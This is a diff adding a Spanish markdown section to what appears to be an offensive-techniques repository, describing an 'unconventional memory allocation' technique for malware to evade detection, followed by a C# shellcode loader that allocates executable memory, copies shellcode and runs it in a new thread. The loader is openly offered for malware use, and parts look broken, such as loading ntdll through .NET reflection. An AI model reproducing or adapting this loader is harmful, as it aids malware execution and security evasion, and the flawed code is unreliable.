@@ -109,6 +109,74 @@ class Program
     }
 }
 
+# Técnica de Asignación de Memoria No Convencional
+
+La técnica de Asignación de Memoria No Convencional es una estrategia utilizada en el desarrollo de malware y herramientas de hacking para alojar y ejecutar código malicioso en regiones de memoria inusuales o no convencionales en un proceso de Windows. Esta técnica se utiliza para evadir la detección de seguridad y dificultar el análisis forense.
+
+## Ejemplo de Código
+
+A continuación se muestra un ejemplo simplificado de cómo se implementa la técnica de Asignación de Memoria No Convencional en C#:
+
+```csharp
+using System;
+using System.Runtime.InteropServices;
+
+class Program
+{
+    // Declaración de la función intermedia para invocar NtAllocateVirtualMemory
+    public delegate IntPtr NtAllocateVirtualMemoryDelegate(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref UIntPtr RegionSize, UInt32 AllocationType, UInt32 Protect);
+
+    // Función intermedia para invocar NtAllocateVirtualMemory
+    static IntPtr InvokeNtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref UIntPtr RegionSize, uint AllocationType, uint Protect)
+    {
+        var ntdll = System.Reflection.Assembly.Load("ntdll");
+        var ntAllocateVirtualMemory = ntdll.GetType("NTDLL.NativeMethods").GetMethod("NtAllocateVirtualMemory");
+        return (IntPtr)ntAllocateVirtualMemory.Invoke(null, new object[] { ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect });
+    }
+
+    // Función para ejecutar shellcode en un proceso de destino utilizando Asignación de Memoria No Convencional
+    static void ExecuteShellcode()
+    {
+        // Shellcode a ejecutar
+        byte[] shellcode = { /* Shellcode aquí */ };
+
+        // Invocar la función intermedia para realizar la asignación de memoria no convencional
+        IntPtr processHandle = GetCurrentProcess();
+        IntPtr baseAddress = IntPtr.Zero;
+        UIntPtr regionSize = new UIntPtr((uint)shellcode.Length);
+        IntPtr result = InvokeNtAllocateVirtualMemory(processHandle, ref baseAddress, IntPtr.Zero, ref regionSize, 0x3000, 0x40);
+        if (result != IntPtr.Zero)
+        {
+            Console.WriteLine($"Error al asignar memoria no convencional: 0x{result.ToInt32():X}");
+            return;
+        }
+
+        // Copiar el shellcode a la memoria asignada
+        Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);
+
+        // Ejecutar el shellcode desde la memoria asignada
+        IntPtr threadHandle = IntPtr.Zero;
+        IntPtr threadId = IntPtr.Zero;
+        threadHandle = CreateThread(IntPtr.Zero, 0, baseAddress, IntPtr.Zero, 0, ref threadId);
+        WaitForSingleObject(threadHandle, 0xFFFFFFFF);
+    }
+
+    // Declaraciones de las funciones nativas necesarias
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetCurrentProcess();
+
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, ref IntPtr lpThreadId);
+
+    [DllImport("kernel32.dll")]
+    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+
+    static void Main(string[] args)
+    {
+        // Ejecutar el shellcode en un proceso de destino
+        ExecuteShellcode();
+    }
+}
 
 
 Descargo de Responsabilidad:
